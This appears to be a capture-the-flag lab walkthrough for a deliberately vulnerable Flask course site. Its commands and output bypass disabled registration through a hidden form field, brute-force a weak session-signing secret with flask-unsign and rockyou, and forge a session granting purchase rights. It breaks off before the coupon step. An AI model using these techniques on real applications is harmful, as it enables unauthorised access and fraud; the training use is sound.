# Task 3. Bypass Registration and Purchase a Course

You are tasked with testing a vulnerable e-learning platform where critical security flaws exist. The registration process has been intentionally disabled, but users are still given a free coupon that can be redeemed to purchase a course. However, this coupon can only be used once. Your mission is to bypass the registration phase, escalate your privileges to gain purchase permissions, and exploit the vulnerability in order to redeem the coupon multiple times to successfully purchase a course. The task will require you to utilize your knowledge of session hijacking, session manipulation, and other advanced web application vulnerabilities such as PHP deserialization and insecure direct object reference (IDOR).

Objective:

- Bypass the Registration: The registration functionality has been disabled to prevent unauthorized sign-ups. Investigate the application’s behavior and find a way to bypass this restriction to create an account.
- Gain Purchase Permissions: Once you have bypassed the registration, modify your session to enable course purchases. The platform restricts users from purchasing courses unless certain conditions (such as permissions) are met. By modifying your session data, you should be able to unlock the purchase functionality.
- Redeem the Coupon: Although the coupon can only be redeemed once, the application may have a flaw that allows you to reuse it. Attempt to exploit this vulnerability by sending multiple synchronous requests to redeem the coupon several times, ultimately enabling you to purchase a course.

**Hints**:

- **Session Hijacking**: Use tools like flask-unsign to inspect and modify the session cookie.
- **Session Modification**: Change the can_buy permission in the session to allow purchasing the course.
- **Coupon Redeem Limitation**: The coupon can only be used once, but try sending multiple synchronous requests to exploit this.

**Tools and Resources:**

- **Flask-Unsign**: Flask-Unsign.
- **Postman**: You can use Postman to send HTTP requests, modify headers, inspect and manipulate cookies, and test for vulnerabilities like session hijacking.
- **Burp Suite**: You can use Burp Suite to inspect requests, modify parameters, and test for potential security flaws.

- **Initial Endpoint**: http://web0x0a.task3.hbtn/

Good luck!

**Repo**:

- **GitHub repository**: `dlh-cyber_security`
- **Directory**: `web_application_security/0x0a_advanced_web_attack_techniques`
- **File**: `3-flag.txt`

**Target IP address**: `10.42.178.126`


## **Solution**:

- Start sandbox `cyber_websec_0x0a_task3`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.178.126 web0x0a.task3.hbtn" | sudo tee -a /etc/hosts
sudo vim /etc/hosts
ping -c 2 web0x0a.task3.hbtn
```






This challenge has three distinct stages:

1. **Registration bypass:** Create an account despite disabled registration.
2. **Session manipulation:** Investigate the Flask session and the `can_buy` permission.
3. **Coupon race condition:** Determine whether concurrent redemption requests can bypass the one-use limit.

We'll establish how the application works before attempting any of these.

### **Task 3: Step 1 - Inspect the application**

Target IP: `10.42.178.126`

**Run this command in Kali:**

```bash
curl -i -sS http://10.42.178.126/
```

### **What we're looking for**

- The framework and web server.
- Any redirects to login or registration.
- HTML forms and their endpoints.
- Session cookies, particularly Flask's `session` cookie.
- Links to courses, coupons, or account functionality.

Flask commonly stores session data in a cryptographically signed client-side cookie. If this application uses that mechanism, the session's contents may be readable even though modifying them requires a valid signature.

<img src="./task3_login.png" alt="Task 3 Login Page" width="800"/>

<img src="./task3_login_footer.png" alt="Task 3 Login Footer" width="800"/>


```bash
curl -i -sS http://10.42.178.126/

HTTP/1.1 302 FOUND
Server: nginx/1.22.1
Date: Tue, 24 Nov 2026 21:02:46 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 199
Connection: keep-alive
Location: /login
Vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
```

```html
curl -i -sS http://10.42.178.126/login

HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Tue, 24 Nov 2026 21:02:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 201818
Connection: keep-alive
Vary: Cookie

<!DOCTYPE html>
<html lang="en">

        <head>
    <!-- Meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <!-- SITE TITLE -->
    <title>Login - Holberton</title>
    <!-- Latest Bootstrap min CSS -->
    <link rel="stylesheet" href="/static/bootstrap/css/bootstrap.min.css ">
    <!-- Google Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@400;500;600;700&display=swap" rel="stylesheet">
    <!-- Icon CSS -->
    <link rel="stylesheet" href="/static/fonts/themify-icons.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <link rel="stylesheet" href="/static/css/line-awesome.css">
    <link rel="stylesheet" href="/static/fonts/fontawesome/fontawesome.css">
    <!--- owl carousel Css-->
    <link rel="stylesheet" href="/static/owlcarousel/css/owl.carousel.min.css">
    <link rel="stylesheet" href="/static/owlcarousel/css/owl.theme.default.min.css">
    <!--Preloader Css-->
    <link rel="stylesheet" href="/static/css/preloader.css">
    <!--jquery-simple-mobilemenu Css-->
    <link rel="stylesheet" href="/static/css/jquery-simple-mobilemenu.css">
    <!--magnific-popup Css-->
    <link rel="stylesheet" href="/static/css/magnific-popup.css">
    <!--animate Css-->
    <link rel="stylesheet" href="/static/css/animate.css">
    <!--YouTubePopUp Css-->
    <link rel="stylesheet" href="/static/css/YouTubePopUp.css">
     <!--Slick Css-->
    <link rel="stylesheet" href="/static/css/slick.css">
    <!--slick theme Css-->
    <link rel="stylesheet" href="/static/css/slick-theme.css">
    <!-- Style CSS -->
    <link rel="stylesheet" href="/static/css/style.css">
    <!-- Responsive CSS -->
    <link rel="stylesheet" href="/static/css/responsive.css">

  </head>

        <body>


                <!-- Start Header -->
                                <!-- Start Header -->
                <header id="navigation">
                        <div class="container-fluid">
                                <div class="row">
                                        <div class="col-30 left-col align-self-center">
                                                <div class="site-logo">
                                                        <a href="index.html"><img style="width:180px" src="/static/img/logo.svg" alt="Holberton"></a>
                                                </div>
                                        </div><!-- End Col -->

                                        <div class="col-40 justify-content-center d-flex align-self-center">
                                                <nav id="main-menu">
                                                        <ul>
                                                                <li class="menu-item">
                                                                        <a href="/">Home</a>
                                                                </li>

                                                                <li class="menu-item">
                                                                        <a href="/courses">Courses</a>
                                                                </li>

                                                                <li>
                                                                        <a href="/blog">Blog</a>
                                                                </li>

                                                                <li>
                                                                        <a href="/contact">Contact</a>
                                                                </li>
                                                        </ul>
                                                </nav>
                                        </div><!-- End Col -->
                                        <div class="col-30 right-col align-self-center text-end">

                                                        <a href="/login" class="white-btn bt">Login / Register</a>

                                        </div><!-- End Col -->
                                </div>
                        </div>
                </header>
                <!-- END Header -->
                <!-- End Header -->

                <!-- Start Main Banner -->
                <section class="main-banner" style="background-image: url(assets/img/bg/banner.jpg);">
                        <div class="container">
                                <div class="row">
                                        <div class="col-xl-12 text-center">
                                                <h2>Login</h2>
                                                <p>
                                                        <a href="#">Home</a> <i class='bx bx-chevrons-right'></i> Login
                                                </p>
                                        </div>
                                </div>
                        </div>

. . .

                </section>
                <!-- End Main Banner -->

                <!-- START LOGIN -->
                <section class="login_register section-padding">
                        <div class="container">
                                <div class="row">
                                        <div class="col-lg-6 offset-lg-3 col-xs-12 wow fadeIn">
                                                <div class="login">
                                                        <h4 class="login_register_title">Already a member? Sign in:</h4>
              <h4 style="padding-left: 30% ; color: red">  </h4>
                                                        <form action="/login" method="post">
                                                                <div class="form-group">
                                                                <label for="username">Username</label>
                                                                <input type="text" id="username" placeholder="Enter Username" class="form-control" name="username">
                                                        </div>
                                                        <div class="form-group">
                                                                <label for="password">Password</label>
                                                                <input type="password" placeholder="Enter Password" id="password" class="form-control" name="password" >
                                                        </div>

                                                        <div class="form-check mb-4">
                                                                <input id="rpaword" class="form-check-input" type="checkbox">
                                                                <label class="form-check-label" for="rpaword" >
                                                                        Remember Password
                                                                </label>
                                                        </div>

                                                        <div class="form-group col-lg-12">
                                                                <button class="bg_btn bt" type="submit" name="submit">login</button>
                                                        </div>
                                                        </form>

                                                        <p>Don't have an account? <a href="/register">Register Now</a></p>
                                                </div>
                                        </div><!--- END COL -->
                                </div><!--- END ROW -->
                        </div><!--- END CONTAINER -->
                </section>
                <!-- END LOGIN -->

                <!-- Start Footer -->
                <section class="footer">
                        <div class="container">
                                <div class="row">
                                        <div class="col-xl-7 col-lg-7 wow fadeIn">
                                                <h2 class="fntitle">Subscribe to Our  Newsletter <br>
                                                for Latest Update</h2>
                                        </div>

                                        <div class="col-xl-5 col-lg-5 align-self-center wow fadeIn">
                                                <div class="newsletter">
                                                        <form action="#" method="post">
                                                                <input type="email" name="EMAIL" placeholder="Email Address">
                                                                <button type="submit">Subscribe</button>
                                                        </form>
                                                </div>
                                        </div>
                                </div>

                                <div class="row footer-bottom">
                                        <div class="col-xl-3 col-md-6 col-12 wow fadeIn">
                                                <div class="single-footer">
                                                        <div class="about-footer">
                                                                <div class="footer-logo">
                                                                        <a href="#"><img style="width:180px" src="/static/img/logo.svg" alt="Holberton"></a>
                                                                </div>
                                                                <p>
                                                                        Lorem ipsum dolor sit amet, consectetur adipiscing elit varius congue Morbi
                                                                </p>

                                                                <div class="fot-social">
                                                                        <span>Follow Us On :</span>
                                                                        <ul>
                                                                                <li>
                                                                                        <a href="#"><i class="bx bxl-facebook"></i></a>
                                                                                </li>

                                                                                <li>
                                                                                        <a href="#"><i class="bx bxl-twitter"></i></a>
                                                                                </li>
                                                                                <li>
                                                                                        <a href="#"><i class="bx bxl-linkedin"></i></a>
                                                                                </li>
                                                                                <li>
                                                                                        <a href="#"><i class="bx bxl-youtube"></i></a>
                                                                                </li>
                                                                        </ul>
                                                                </div>
                                                        </div>
                                                </div>
                                        </div><!-- End Col -->

                                        <div class="col-xl-3 col-md-6 col-12 wow fadeIn">
                                                <div class="single-footer">
                                                        <h3 class="footer-title">Useful Links</h3>
                                                        <ul>
                                                                <li><a href="#">Home</a></li>
                                                                <li><a href="#">About Us</a></li>
                                                                <li><a href="#">Courses</a></li>
                                                                <li><a href="#">Categories</a></li>
                                                                <li><a href="#">Pricing</a></li>
                                                                <li><a href="#">Contact</a></li>
                                                        </ul>
                                                </div>
                                        </div><!-- End Col -->

                                        <div class="col-xl-3 col-md-6 col-12 wow fadeIn">
                                                <div class="single-footer">
                                                        <h3 class="footer-title">Resources</h3>
                                                        <ul>
                                                                <li><a href="#">Community</a></li>
                                                                <li><a href="#">Support</a></li>
                                                                <li><a href="#">Video Guides</a></li>
                                                                <li><a href="#">Terms and Conditions</a></li>
                                                                <li><a href="#">Blog</a></li>
                                                                <li><a href="#">Security</a></li>
                                                        </ul>
                                                </div>
                                        </div><!-- End Col -->

                                        <div class="col-xl-3 col-md-6 col-12 wow fadeIn">
                                                <div class="single-footer">
                                                        <h3 class="footer-title">Contact Us</h3>
                                                        <div class="contact-info">
                                                                <p>
                                                                        <i class='bx bx-map' ></i>
                                                                        <span>15 Rose StreetHarvey, IL <br>
                                                                        60426 USA</span>
                                                                </p>
                                                                <p>
                                                                        <i class='bx bx-phone' ></i>
                                                                        <span>
                                                                        708-210-9101</span>
                                                                </p>

                                                                <p>
                                                                        <i class='bx bx-envelope'></i>
                                                                        <span>
                                                                        example@education.com</span>
                                                                </p>
                                                        </div>
                                                </div>
                                        </div><!-- End Col -->
                                </div>

                        </div>

. . .

                </section>
                <!-- End Footer -->


                <!-- Latest jQuery -->
                <script src="assets/js/jquery.min.js" ></script>
                <!-- Latest compiled and minified Bootstrap -->
                <script src="assets/bootstrap/js/bootstrap.min.js"></script>
                <!-- jquery-simple-mobilemenu.min -->
                <script src="assets/js/jquery-simple-mobilemenu.js"></script>
                <!-- imagesloaded.pkgd -->
                <script src="assets/js/imagesloaded.pkgd.min.js"></script>
                <!-- masonry -->
                <script src="assets/js/masonry.pkgd.min.js" ></script>
                <!-- modernizer JS -->
                <script src="assets/js/modernizr-2.8.3.min.js"></script>
                <!-- owl-carousel min js  -->
                <script src="assets/owlcarousel/js/owl.carousel.min.js"></script>
                <!-- waypoints -->
                <script src="assets/js/waypoints.min.js"></script>
                <!-- counterup -->
                <script src="assets/js/jquery.counterup.min.js"></script>
                <!-- jquery appear js -->
                <script src="assets/js/jquery.appear.js"></script>
                <!-- magnific-popup js -->
                <script src="assets/js/jquery.magnific-popup.js"></script>
                <!-- YouTubePopUp js -->
                <script src="assets/js/YouTubePopUp.jquery.js"></script>
                <!-- yvpopup-active js -->
                <script src="assets/js/yvpopup-active.js"></script>
                <!-- scrolltopcontrol js -->
                <script src="assets/js/scrolltopcontrol.js"></script>
                <!-- nicesellect js -->
                <script src="assets/js/nicesellect.js"></script>
                <!-- Wow js -->
                <script src="assets/js/wow.js"></script>
                <!-- slick js -->
                <script src="assets/js/slick.js"></script>
                <!-- scripts js -->
                <script src="assets/js/scripts.js"></script>

        </body>
</html>
```


### **Task 3: Step 2 - Investigate the registration endpoint**

The terminal output and screenshots confirm:

- The application uses Flask.
- `/` redirects to `/login`.
- Authentication uses `POST /login` with `username` and `password`.
- The login page still contains a **Register Now** link pointing to `/register`.

That last detail is interesting.

The challenge says registration is disabled, but we need to determine whether the restriction is enforced by the backend or only by the registration interface.

### **Action**

Run:

```bash
curl -sS -D - -o /dev/null http://10.42.178.126/register
```

This retrieves the registration page but displays only the HTTP response headers, avoiding another enormous HTML output.

**What we're looking for:**

- `200 OK`: The registration page still exists.
- `403 Forbidden`: Registration access is explicitly blocked.
- `404 Not Found`: The route may have been removed.
- `302 Found`: The server may redirect visitors away from registration.


**Command output:**

```bash
curl -sS -D - -o /dev/null http://10.42.178.126/register

HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Tue, 24 Nov 2026 21:17:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 201845
Connection: keep-alive
Vary: Cookie
```


### **Task 3: Step 3 - Inspect the registration form**

The registration endpoint returns:

```
HTTP/1.1 200 OK
Content-Length: 201845
```

So **the registration page still exists**, despite the challenge saying registration is disabled.

This suggests the restriction may be enforced when the form is submitted, rather than when the page is displayed.

Before testing that, we need to identify the form's fields.

### **Action**

Run:

```bash
curl -sS http://10.42.178.126/register | rg -n -C 5 'action=|name="username"|name="password"|name="email"'
```

**What this does:**

- Downloads the registration page.
- Searches its HTML for form actions and common registration fields.
- Displays five lines of surrounding context.
- Avoids printing the entire 200 KB page.

We're looking for the form's submission URL and parameter names.


**Command output:**

```html
curl -sS http://10.42.178.126/register | rg -n -C 5 'action=|name="username"|name="password"|name="email"'

121-                            <div class="row">
122-                                    <div class="col-lg-6 offset-lg-3 col-xs-12 wow fadeIn">
123-                                            <div class="register">
124-                                                    <h4 class="login_register_title">Create a new account:</h4>
125-                                                    <p style="color:red">  </p>
126:                                                    <form method="post" action="/register">
127-                                                            <div class="form-group">
128-                                                            <label for="username">Username</label>
129:                                                            <input type="text" placeholder="Enter Username" id="username" class=" form-control" name="username">
130-                                                    </div>
131-
132-                                                    <div class="form-group">
133-                                                            <label for="email-address">Email Address</label>
134:                                                            <input type="email" placeholder="Enter Email Address" id="email-address" class="form-control " name="email" >
135-                                                    </div>
136-                                                    <div class="form-group">
137-                                                            <label for="cpwd">Password</label>
138:                                                            <input type="password" placeholder="Enter Password" id="cpwd" class="form-control" name="password" >
139-                                                    </div>
140-                                                    <div class="form-group col-lg-12">
141-                                                            <button class="bg_btn bt" type="submit" name="submit">Signup now</button>
142-                                                    </div>
143-                                                    <input type="text" hidden id="registration" name="registration" class="form-control" value="disabled">
--
161-                                            for Latest Update</h2>
162-                                    </div>
163-
164-                                    <div class="col-xl-5 col-lg-5 align-self-center wow fadeIn">
165-                                            <div class="newsletter">
166:                                                    <form action="#" method="post">
167-                                                            <input type="email" name="EMAIL" placeholder="Email Address">
168-                                                            <button type="submit">Subscribe</button>
169-                                                    </form>
170-                                            </div>
171-                                    </div>
```

💡🚨&#x20;Registration bypass candidate found!

Checking line 143:

```html
<input type="text" hidden id="registration"
       name="registration" value="disabled">
```

This is almost certainly the key to the first part of Task 3.

The form sends a hidden parameter:

```html
registration=disabled
```

But **hidden HTML inputs are completely controlled by the client**. We can change their values before submitting the request.

If the server relies on this parameter to decide whether registration is allowed, that's an access-control vulnerability.

### **Task 3: Step 4 - Test registration with a modified parameter**

Let's submit the registration form directly, replacing `disabled` with `enabled`.

**Run this command:**

```bash
curl -i -sS -c /tmp/task3_register.cookies --data-urlencode 'username=task3_lab_7c29' --data-urlencode 'email=task3_lab_7c29@example.test' --data-urlencode 'password=Task3_Test_7284' --data-urlencode 'registration=enabled' http://10.42.178.126/register
```

This creates a lab account with:

- Username: `task3_lab_7c29`
- Password: `Task3_Test_7284`
- Registration parameter: `enabled`

The `-c` option saves any session cookie returned by the server.

**Expected possibilities:**

- Redirect to `/login`: The account may have been created.
- Redirect to a dashboard: Registration and automatic login may have succeeded.
- An error: We'll inspect the server's validation logic.


**Command output:**

```bash
curl -i -sS -c /tmp/task3_register.cookies --data-urlencode 'username=task3_lab_7c29' --data-urlencode 'email=task3_lab_7c29@example.test' --data-urlencode 'password=Task3_Test_7284' --data-urlencode 'registration=enabled' http://10.42.178.126/register

HTTP/1.1 302 FOUND
Server: nginx/1.22.1
Date: Tue, 24 Nov 2026 21:30:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 189
Connection: keep-alive
Location: /
Vary: Cookie
Set-Cookie: session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkifQ.awYB5Q.LqUmCZfB2HxD24hLvWmIW79l52A; HttpOnly; Path=/

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```


✅&#x20;Registration bypass successful!

The server returned:

```
HTTP/1.1 302 FOUND
Location: /
Set-Cookie: session=...
```

This confirms that the application accepted our modified registration request and issued a Flask session cookie.

The hidden `registration=disabled` field was the weakness. By submitting `registration=enabled`, we bypassed the restriction.

### **Task 3: Step 5 - Decode the Flask session**

The session cookie is:

```
eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkifQ.awYB5Q.LqUmCZfB2HxD24hLvWmIW79l52A
```

Flask's default session cookies are signed, not encrypted. That means we can inspect their contents without knowing the signing key.

**Action:**

Run:

```bash
flask-unsign --decode --cookie 'eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkifQ.awYB5Q.LqUmCZfB2HxD24hLvWmIW79l52A'
```

**What we're looking for:**

The decoded session should contain something resembling:

```
{'user_id': 'task3_lab_7c29'}
```

We're particularly interested in whether the session already contains a `can_buy` permission.

Decoding the cookie is read-only. Modifying it would require generating a valid signature, which we'll investigate separately.


**Command output:**

```bash
flask-unsign --decode --cookie 'eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkifQ.awYB5Q.LqUmCZfB2HxD24hLvWmIW79l52A'

flask-unsign: command not found
```


🤷 `flask-unsign` isn't installed on our Kali system.

We'll install it using `pipx`, which keeps Python command-line tools in isolated environments. This avoids Kali's restrictions on modifying the system Python installation.

### **Task 3: Step 6 - Install flask-unsign**

**Run this command:**

```bash
pipx install flask-unsign
```

This should install the `flask-unsign` command without modifying your system Python packages.


**Command output:**

```bash
pipx install flask-unsign

WARNING: Skipping setuptools as it is not installed.
  installed package flask-unsign 1.2.1, installed using Python 3.14.8
  These apps are now available
    - flask-unsign
done! ✨ 🌟 ✨
```

🎇&#x20;flask-unsign installed

Version `1.2.1` is installed successfully.



### **Task 3: Step 7 - Decode the session**

Now rerun:

```bash
flask-unsign --decode --cookie 'eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkifQ.awYB5Q.LqUmCZfB2HxD24hLvWmIW79l52A'
```

This will decode the cookie's payload without needing the signing key.

Remembering the distinction:

- **Decoding:** Reveals the session contents.
- **Unsigning/cracking:** Attempts to identify the secret used to sign the cookie.
- **Signing:** Creates a new valid session cookie containing modified values.

We need to understand the existing session before attempting to add `can_buy`.


**Command output:**

```bash
flask-unsign --decode --cookie 'eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkifQ.awYB5Q.LqUmCZfB2HxD24hLvWmIW79l52A'

{'user_id': 'task3_lab_7c29'}
```

### **Task 3: Step 8 - Identify the Flask signing secret**

The decoded session is:

```json
{'user_id': 'task3_lab_7c29'}
```

This confirms two things:

1. Our newly registered account is represented in the session.
2. The session doesn't currently contain a `can_buy` permission.

To add that permission, we need to create a new session cookie with a valid signature.

Flask-Unsign can test candidate secret keys against an existing signed cookie. According to its [official documentation](https://github.com/Paradoxis/Flask-Unsign), it supports a default wordlist when one is available.

### **Action**

Install the optional wordlist package:

```bash
pipx install --force 'flask-unsign[wordlist]'
```

Run:

```bash
flask-unsign --unsign --cookie 'eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkifQ.awYB5Q.LqUmCZfB2HxD24hLvWmIW79l52A'
```

**What this does:**

It tests candidate signing secrets locally against the cookie's signature. No requests are sent to the lab server.

If the secret is weak and included in the wordlist, we should see something resembling:

```
[+] Found secret key
'...'
```


**Command output:**

```bash
flask-unsign --unsign --cookie 'eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkifQ.awYB5Q.LqUmCZfB2HxD24hLvWmIW79l52A'

[*] Session decodes to: {'user_id': 'task3_lab_7c29'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----ECR
[*] Attempted (38272): w.;>{1vBC0cstf0WkgGr3FsSvu2SMs
[!] Failed to find secret key after 55982 attempts.6N
```

### **Task 3: Step 10 - Prepare a larger password wordlist**

The default Flask-Unsign wordlist tested 55,982 candidates without finding the signing secret.

That means the secret isn't in that list. It doesn't mean the key is impossible to recover.

We checked the older Holberton GitHub commits. They contain a different Task 3 implementation based on Node.js, so that historical source isn't useful for our current Flask application.

Our next candidate is Kali's `rockyou` wordlist, which contains millions of commonly used passwords.

### **Action**

First, let's check which version of the wordlist is available.

Run:

```bash
ls -lh /usr/share/wordlists/rockyou.txt*
```


For `rockyou`, we'll also need Flask-Unsign's `--no-literal-eval` option because its entries are ordinary text rather than Python string literals.

**Command output:**

```bash
ls -lh /usr/share/wordlists/rockyou.txt*

-rw-r--r-- 1 root root 134M May  7  2026 /usr/share/wordlists/rockyou.txt
```


### **Task 3: Step 11 - Test the RockYou wordlist**

✅&#x20;Wordlist available

We have the full 134 MB `rockyou.txt` file, so no download or extraction is necessary.

Let's test its candidates against the Flask session signature.

**Run this command:**

```bash
flask-unsign --unsign --cookie 'eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkifQ.awYB5Q.LqUmCZfB2HxD24hLvWmIW79l52A' --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
```

### **What's happening?**

Flask signs session cookies using a secret key.

`flask-unsign` takes each word from RockYou, generates a candidate signature, and compares it with the signature in our captured cookie.

The `--no-literal-eval` flag tells the tool to treat each wordlist entry as a plain string.

**Important:** This is an entirely offline operation. It doesn't send login attempts or other requests to the target.

The wordlist contains millions of entries, so this may take several minutes.


**Command output:**

```bash
flask-unsign --unsign --cookie 'eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkifQ.awYB5Q.LqUmCZfB2HxD24hLvWmIW79l52A' --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval

[*] Session decodes to: {'user_id': 'task3_lab_7c29'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 1024 attempts
b'cookie1'
```

🚨😁&#x20;Flask signing key recovered!

RockYou found the secret after only 1,024 attempts:

```
b'cookie1'
```

That is an extremely weak signing key.

Because Flask trusts session cookies that have valid signatures, knowing this key allows us to construct modified sessions.

### **Task 3: Step 12 - Forge a session with purchase permission**

Our original session contains:

```
{'user_id': 'task3_lab_7c29'}
```

We want to add the permission described in the challenge:

```json
{    'user_id': 'task3_lab_7c29',    'can_buy': True}
```

### **Action**

Run:

```bash
flask-unsign --sign --cookie "{'user_id': 'task3_lab_7c29', 'can_buy': True}" --secret 'cookie1'
```

**How it works:**

1. Flask-Unsign serializes our modified session data.
2. It signs the data using the recovered secret `cookie1`.
3. It outputs a new Flask session cookie with a valid signature.

We preserve the original `user_id` so the application can still identify our account.


**Command output:**

```bash
flask-unsign --sign --cookie "{'user_id': 'task3_lab_7c29', 'can_buy': True}" --secret 'cookie1'

eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og
```

✅&#x20;Modified Flask session generated!

We now have a signed session containing:

```json
{    'user_id': 'task3_lab_7c29',    'can_buy': True}
```

The next step is to verify that the application accepts our forged cookie.

### **Task 3: Step 13 - Test the modified session**

**Run this command:**

```bash
curl -sS -D - -o /dev/null -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' http://10.42.178.126/
```

This sends our forged session to the application's homepage.

The options mean:

- `-b`: Supply the session cookie.
- `-D -`: Display HTTP response headers.
- `-o /dev/null`: Discard the large HTML response.

**What we're checking:**

- `200 OK`: The application likely accepts our authenticated session.
- `302` to `/login`: The session may have been rejected.
- Another response: We'll investigate.

A successful response won't yet prove that purchasing is enabled, but it will confirm that the forged session is usable.


**Command output:**

```bash
curl -sS -D - -o /dev/null -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' http://10.42.178.126/

HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Tue, 24 Nov 2026 22:01:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 149293
Connection: keep-alive
Vary: Cookie
```

✅&#x20;Forged session accepted!

The server returned:

```
HTTP/1.1 200 OK
```

Previously, an unauthenticated request to `/` redirected to `/login`.

This confirms the application accepts our modified, signed session.

### **Task 3: Step 14 - Investigate course purchases**

Now we need to identify:

1. Which courses are available.
2. How the purchase process works.
3. Where the `can_buy` permission is checked.
4. How coupons are redeemed.

Let's inspect the courses page while authenticated.

### **Action**

Run:

```bash
curl -sS -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' http://10.42.178.126/courses | rg -n -C 2 '(href="/course|href="/buy|href="/checkout|coupon|Coupon|Purchase|purchase)' | sed -n '1,100p'
```

This retrieves the courses page using our forged session and extracts relevant links and purchase-related text.

The filtering keeps us from printing another large HTML document.


**Command output:**

```html
curl -sS -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' http://10.42.178.126/courses | rg -n -C 2 '(href="/course|href="/buy|href="/checkout|coupon|Coupon|Purchase|purchase)' | sed -n '1,100p'

69-
70-                                                             <li class="menu-item">
71:                                                                     <a href="/courses">Courses</a>
72-                                                             </li>
73-
--
140-                                                                    </a>
141-                                                            </div>
142:                                                            <h2><a href="/course-details">Financial Security Thinking and Principles Theorys</a></h2>
143-
144-                                                            <div class="cmeta">
--
196-                                                                    </a>
197-                                                            </div>
198:                                                            <h2><a href="/course-details">Professional Ceramic Moulding for Beginners</a></h2>
199-                                                            <div class="cmeta">
200-                                                                    <div class="smeta">
--
251-                                                                    </a>
252-                                                            </div>
253:                                                            <h2><a href="/course-details">Basic Fundamentals of Interior & Graphics Design</a></h2>
254-                                                            <div class="cmeta">
255-                                                                    <div class="smeta">
--
306-                                                                    </a>
307-                                                            </div>
308:                                                            <h2><a href="/course-details">Photography Crash Course
309-                                                            for Photographer</a></h2>
310-                                                            <div class="cmeta">
--
362-                                                                    </a>
363-                                                            </div>
364:                                                            <h2><a href="/course-details">WordPress for Beginners – Master WordPress</a></h2>
365-                                                            <div class="cmeta">
366-                                                                    <div class="smeta">
--
417-                                                                    </a>
418-                                                            </div>
419:                                                            <h2><a href="/course-details">Ultimate Photoshop Training: From Beginner</a></h2>
420-                                                            <div class="cmeta">
421-                                                                    <div class="smeta">
```


✅ The `/courses` page is accessible with our forged session, and the course links all point to `/course-details`.

Let's inspect that page for the purchase mechanism.

### **Step 15: Find the purchase form**

Run this command:

```bash
curl -sS -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' http://10.42.178.126/course-details | rg -ni -C 4 'coupon|checkout|purchase|buy now|enroll|<form|action=|name=' | sed -n '1,160p'
```

**What we're looking for:**

- The endpoint responsible for purchasing a course.
- Any coupon redemption form or input field.
- Parameters required to submit a purchase.

The `-C 4` option shows four surrounding lines for each match, giving us context.


**Command output:**

```html
curl -sS -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' http://10.42.178.126/course-details | rg -ni -C 4 'coupon|checkout|purchase|buy now|enroll|<form|action=|name=' | sed -n '1,160p'

4-      <head>
5-              <!-- Meta -->
6-              <meta charset="utf-8">
7-              <meta http-equiv="X-UA-Compatible" content="IE=edge">
8:              <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
9-              <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
10-             <!-- SITE TITLE -->
11-             <title>Register - Holberton</title>
12-             <!-- Latest Bootstrap min CSS -->
--
371-                                                                                    <i class="bx bxs-star"></i>
372-                                                                                    <i class="bx bxs-star"></i>
373-                                                                            </div>
374-
375:                                                                            <form action="#" class="rating_form">
376:                                                                                    <textarea name="rating_form" placeholder="Write a Your Rating">
